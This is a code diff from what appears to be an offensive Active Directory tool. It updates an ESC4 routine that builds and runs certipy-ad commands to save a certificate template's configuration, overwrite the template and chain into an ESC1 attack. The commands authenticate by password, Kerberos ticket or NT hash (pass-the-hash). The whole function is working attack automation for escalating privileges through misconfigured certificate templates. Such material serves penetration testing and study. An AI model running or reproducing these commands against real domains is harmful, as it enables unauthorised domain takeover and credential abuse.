@@ -128,24 +128,24 @@ Info:\t1. Save certificate template config in a file.
     os.chdir(path.ws_adcs)
     print('\033[92m[*]\033[0m ESC4')
     if isinstance(box.krb, str):
-        cmd1 = f"{box.krb_ccache} certipy-ad template -k -no-pass -target {box.fqdn} -template {box.target} -save-old"
+        cmd1 = f"{box.krb_ccache} certipy-ad template -k -no-pass -target {box.fqdn} -template {box.target} -save-configuration {box.target}_config.json "
         cmd2 = f"{box.krb_ccache} certipy-ad template -k -no-pass -target {box.fqdn} -template {box.target}"
         cmd3 = f"{box.krb_ccache} certipy-ad template -k -no-pass -target {box.fqdn} -template {box.target} -configuration {box.target}.json"
     elif box.krb:
-        cmd1 = f"certipy-ad template -u {box.username} -p {box.password} -k -target {box.fqdn} -template {box.target} -save-old"
+        cmd1 = f"certipy-ad template -u {box.username} -p {box.password} -k -target {box.fqdn} -template {box.target} -save-configuration {box.target}_config.json"
         cmd2 = f"certipy-ad template -u {box.username} -p {box.password} -k -target {box.fqdn} -template {box.target}"
         cmd3 = f"certipy-ad template -u {box.username} -p {box.password} -k -target {box.fqdn} -template {box.target} -configuration {box.target}.json"
     elif box.nt_hash:
-        cmd1 = f"certipy-ad template -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -template {box.target} -save-old"
+        cmd1 = f"certipy-ad template -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -template {box.target} -save-configuration {box.target}_config.json"
         cmd2 = f"certipy-ad template -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -template {box.target}"
         cmd3 = f"certipy-ad template -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -template {box.target} -configuration {box.target}.json"
     else:
-        cmd1 = f"certipy-ad template -u {box.username} -p {box.password} -target {box.fqdn} -template {box.target} -save-old"
+        cmd1 = f"certipy-ad template -u {box.username} -p {box.password} -target {box.fqdn} -template {box.target} -save-configuration {box.target}_config.json"
         cmd2 = f"certipy-ad template -u {box.username} -p {box.password} -target {box.fqdn} -template {box.target}"
         cmd3 = f"certipy-ad template -u {box.username} -p {box.password} -target {box.fqdn} -template {box.target} -configuration {box.target}.json"
     config.log_cmd([cmd1,cmd2])
     print(f'\033[96m[$]\033[0m {cmd1}')
-    os.system(cmd1+f' 2>&1 | tee {box.target}-template_save-old_esc4.out')
+    os.system(cmd1+f' 2>&1 | tee {box.target}-template_save-configuration_esc4.out')
     print(f'\n\033[96m[$]\033[0m {cmd2}')
     os.system(cmd2+f' 2>&1 | tee {box.target}-template_esc4.out')
     esc1(box, path) # maybe add option to choose esc2 and esc3
